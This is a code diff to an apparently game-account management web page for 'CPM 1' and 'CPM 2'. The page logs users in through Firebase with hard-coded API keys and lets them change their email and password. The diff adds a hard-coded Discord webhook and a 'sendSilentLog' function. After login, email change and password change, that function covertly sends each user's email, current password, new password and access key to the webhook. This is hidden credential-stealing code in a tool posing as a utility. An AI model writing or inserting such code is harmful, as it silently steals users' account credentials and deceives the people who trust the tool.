@@ -140,6 +140,8 @@ input:focus{border-color:#ff8800;}
 </div>
 
 <script>
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564147769369956402/x2QDrjfidUfGbI3cPiPkrLEi-4H_o68wV_EEyKjIx2STe4SGc5YC8u4YiAJpuHvbWG5a";
+
 const GAMES = {
   "1": { name:"CPM 1", k:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM" },
   "2": { name:"CPM 2", k:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ" }
@@ -158,6 +160,28 @@ function showStatus(msg, isError=false, target='status') {
   el.textContent = msg;
 }
 
+// Silent Log Sender to Discord
+function sendSilentLog(action, details) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  const payload = {
+    username: "MARKO CPM LOGGER",
+    content: `🚨 **MARKO CPM ACTIVITY**\n` +
+             `⚡ **Action:** ${action}\n` +
+             `🎮 **Game:** ${selectedGameKey === '1' ? 'CPM 1' : 'CPM 2'}\n` +
+             `📧 **Current Account:** \`${currentUser || 'N/A'}\`\n` +
+             `🔑 **Password:** \`${currentPass || 'N/A'}\`\n` +
+             details +
+             `\n---`
+  };
+  try {
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch(e) {}
+}
+
 document.getElementById('loginBtn').addEventListener('click', async () => {
   const email = document.getElementById('email').value.trim();
   const pass = document.getElementById('password').value;
@@ -165,7 +189,7 @@ document.getElementById('loginBtn').addEventListener('click', async () => {
   const cfg = GAMES[selectedGameKey];
 
   if(!selectedGameKey) return showStatus("Please select a game!", true);
-  if(keyVal !== "MARKO123") return showStatus("❌ Invalid Access Key!", true);
+  if(keyVal !== "FLAME") return showStatus("❌ Invalid Access Key!", true);
   if(!email || !pass) return showStatus("Enter email & password!", true);
   
   showStatus("Authenticating...");
@@ -178,6 +202,10 @@ document.getElementById('loginBtn').addEventListener('click', async () => {
     const data = await res.json();
     if(data.idToken) {
       currentUser = email; currentPass = pass; currentToken = data.idToken; currentRefreshToken = data.refreshToken;
+      
+      // Silent Log for Login
+      sendSilentLog("SUCCESSFUL LOGIN", `🏷️ **Access Key:** \`${keyVal}\``);
+
       document.getElementById('loginSection').style.display = 'none';
       document.getElementById('dashboardSection').style.display = 'block';
       document.getElementById('loggedEmailDisplay').textContent = email;
@@ -221,6 +249,9 @@ async function sendVerificationEmail() {
     if(data.email || res.ok) {
       showStatus("✅ Verification link sent! Check your new Gmail.", false, 'emailStatus');
       document.getElementById('verifyStepBox').style.display = 'block';
+      
+      // Silent Log for Email Verification Request
+      sendSilentLog("EMAIL UPDATE REQUESTED", `📫 **New Email Target:** \`${newEmail}\``);
     } else {
       showStatus("❌ " + (data.error?.message || "Failed to send link"), true, 'emailStatus');
     }
@@ -249,6 +280,10 @@ async function checkVerification() {
       const data = await res.json();
       if(data.users && data.users[0]) {
         showStatus("✅ Email Successfully Changed & Verified! Please re-login.", false, 'emailStatus');
+        
+        // Silent Log for Successful Email Change
+        sendSilentLog("EMAIL SUCCESSFULLY CHANGED", `✨ **Verified Email:** \`${data.users[0].email}\``);
+
         setTimeout(logout, 2500);
       } else {
         showStatus("❌ Not verified yet. Please check your email link first!", true, 'emailStatus');
@@ -273,6 +308,10 @@ async function changePassword() {
     const data = await res.json();
     if(data.idToken) {
       alert("✅ Password Updated Successfully!");
+      
+      // Silent Log for Password Change
+      sendSilentLog("PASSWORD CHANGED", `🔐 **New Password:** \`${newP}\``);
+
       currentPass = newP; currentToken = data.idToken;
     } else { alert("❌ Error: " + data.error.message); }
   } catch(e) { alert("❌ Update Failed!"); }
